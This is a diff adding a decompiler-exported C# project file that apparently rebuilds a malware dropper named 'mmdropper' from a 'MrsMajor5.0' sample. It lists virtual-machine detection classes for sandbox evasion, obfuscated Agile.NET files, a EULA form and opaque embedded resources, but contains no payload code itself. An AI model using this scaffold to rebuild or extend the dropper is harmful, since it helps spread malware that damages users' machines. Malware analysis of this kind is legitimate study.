@@ -1,0 +1,188 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\victim\Documents\GitHub\MrsMajor5.0\AgileStringDecryptor-master\bin\Debug\net48\eulascr-Utf8Fixed.exe-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{C57157B1-1E04-4A42-858E-3A09E6AB0DEB}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>mmdropper</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <TargetFrameworkProfile />
+    <ApplicationVersion>1.0.7321.42228</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="AgileDotNet.VMRuntime, Version=6.6.0.12, Culture=neutral, PublicKeyToken=8df7194b9dc850cb, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>bin\Debug\AgileDotNet.VMRuntime.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="_003CModule_003E.cs" />
+    <Compile Include="IVirtualEnvironment.cs" />
+    <Compile Include="BaseVirtualEnvironment.cs" />
+    <Compile Include="HyperVMachine.cs" />
+    <Compile Include="QEmuMachine.cs" />
+    <Compile Include="VirtualBoxMachine.cs" />
+    <Compile Include="VirtualPcMachine.cs" />
+    <Compile Include="VmWareMachine.cs" />
+    <Compile Include="VmWarePlayer.cs" />
+    <Compile Include="VirtualMachineDetector.cs" />
+    <Compile Include="BaseWin32Entity.cs" />
+    <Compile Include="BiosCharacteristics.cs" />
+    <Compile Include="BIOS.cs" />
+    <Compile Include="ComputerSystem.cs" />
+    <Compile Include="DiskDrive.cs" />
+    <Compile Include="MotherboardDevice.cs" />
+    <Compile Include="PnPEntity.cs" />
+    <Compile Include="WindowsService.cs" />
+    <Compile Include="AgileDotNetRT.cs" />
+    <Compile Include="oxM.cs" />
+    <Compile Include="InitializeDelegate.cs" />
+    <Compile Include="ExitDelegate.cs" />
+    <Compile Include="FE3C441D-DF9D-407b-917D-0B4471A8296C.cs" />
+    <Compile Include="_U7777_.cs" />
+    <Compile Include="_U7778_.cs" />
+    <Compile Include="_U7779_.cs" />
+    <Compile Include="_U777A_.cs" />
+    <Compile Include="_U777B_.cs" />
+    <Compile Include="_U777C_.cs" />
+    <Compile Include="_U777D_.cs" />
+    <Compile Include="_U777E_.cs" />
+    <Compile Include="_U777F_.cs" />
+    <Compile Include="_U7780_.cs" />
+    <Compile Include="_U7781_.cs" />
+    <Compile Include="_U7782_.cs" />
+    <Compile Include="_U7783_.cs" />
+    <Compile Include="_U7784_.cs" />
+    <Compile Include="_U7785_.cs" />
+    <Compile Include="_U7786_.cs" />
+    <Compile Include="_U7787_.cs" />
+    <Compile Include="_U7788_.cs" />
+    <Compile Include="_U7789_.cs" />
+    <Compile Include="_U778A_.cs" />
+    <Compile Include="_U778B_.cs" />
+    <Compile Include="_U778C_.cs" />
+    <Compile Include="_U778D_.cs" />
+    <Compile Include="_U778E_.cs" />
+    <Compile Include="_U778F_.cs" />
+    <Compile Include="_U7790_.cs" />
+    <Compile Include="_U7791_.cs" />
+    <Compile Include="_U7792_.cs" />
+    <Compile Include="_U7793_.cs" />
+    <Compile Include="_U7794_.cs" />
+    <Compile Include="_U7795_.cs" />
+    <Compile Include="_U7796_.cs" />
+    <Compile Include="_U7797_.cs" />
+    <Compile Include="_U7798_.cs" />
+    <Compile Include="_U7799_.cs" />
+    <Compile Include="_U779A_.cs" />
+    <Compile Include="_U779B_.cs" />
+    <Compile Include="_U779C_.cs" />
+    <Compile Include="_U779D_.cs" />
+    <Compile Include="_U779E_.cs" />
+    <Compile Include="_U779F_.cs" />
+    <Compile Include="_U77A0_.cs" />
+    <Compile Include="_U77A1_.cs" />
+    <Compile Include="_U77A2_.cs" />
+    <Compile Include="_U77A3_.cs" />
+    <Compile Include="_U77A4_.cs" />
+    <Compile Include="_U77A5_.cs" />
+    <Compile Include="_U77A6_.cs" />
+    <Compile Include="_U77A7_.cs" />
+    <Compile Include="_U77A8_.cs" />
+    <Compile Include="_U77A9_.cs" />
+    <Compile Include="_U77AA_.cs" />
+    <Compile Include="_U77AB_.cs" />
+    <Compile Include="_U77AC_.cs" />
+    <Compile Include="_U77AD_.cs" />
+    <Compile Include="_U77AE_.cs" />
+    <Compile Include="_U77AF_.cs" />
+    <Compile Include="_U77B0_.cs" />
+    <Compile Include="_U77B1_.cs" />
+    <Compile Include="_U77B2_.cs" />
+    <Compile Include="_U77B3_.cs" />
+    <Compile Include="_U77B4_.cs" />
+    <Compile Include="_U77B5_.cs" />
+    <Compile Include="_U77B6_.cs" />
+    <Compile Include="_U77B7_.cs" />
+    <Compile Include="_U77B8_.cs" />
+    <Compile Include="_U77B9_.cs" />
+    <Compile Include="_U77BA_.cs" />
+    <Compile Include="_U77BB_.cs" />
+    <Compile Include="_U77BC_.cs" />
+    <Compile Include="_U77BD_.cs" />
+    <Compile Include="_U77BE_.cs" />
+    <Compile Include="_U77BF_.cs" />
+    <Compile Include="_U77C0_.cs" />
+    <Compile Include="_U77C1_.cs" />
+    <Compile Include="_U77C2_.cs" />
+    <Compile Include="_U77C3_.cs" />
+    <Compile Include="_U77C4_.cs" />
+    <Compile Include="_U77C5_.cs" />
+    <Compile Include="_U77C6_.cs" />
+    <Compile Include="_U77C7_.cs" />
+    <Compile Include="_U77C8_.cs" />
+    <Compile Include="_U77C9_.cs" />
+    <Compile Include="_U77CA_.cs" />
+    <Compile Include="_U77CB_.cs" />
+    <Compile Include="_U77CC_.cs" />
+    <Compile Include="_U77CD_.cs" />
+    <Compile Include="_U77CE_.cs" />
+    <Compile Include="_U77CF_.cs" />
+    <Compile Include="_U77D0_.cs" />
+    <Compile Include="_U77D1_.cs" />
+    <Compile Include="_U77D2_.cs" />
+    <Compile Include="_U77D3_.cs" />
+    <Compile Include="_U77D4_.cs" />
+    <Compile Include="_U77D5_.cs" />
+    <Compile Include="_U77D6_.cs" />
+    <Compile Include="_U77D7_.cs" />
+    <Compile Include="_U77D8_.cs" />
+    <Compile Include="mmdropper\eulaform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="mmdropper\MainForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="mmdropper\Program.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="5a530dfd-bc51-4992-a05d-f09d41a331d4" />
+    <EmbeddedResource Include="d030ea86-a65f-4973-bac9-d77cf1987632" />
+    <EmbeddedResource Include="mmdropper\eulaform.resx" />
+    <EmbeddedResource Include="mmdropper\MainForm.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
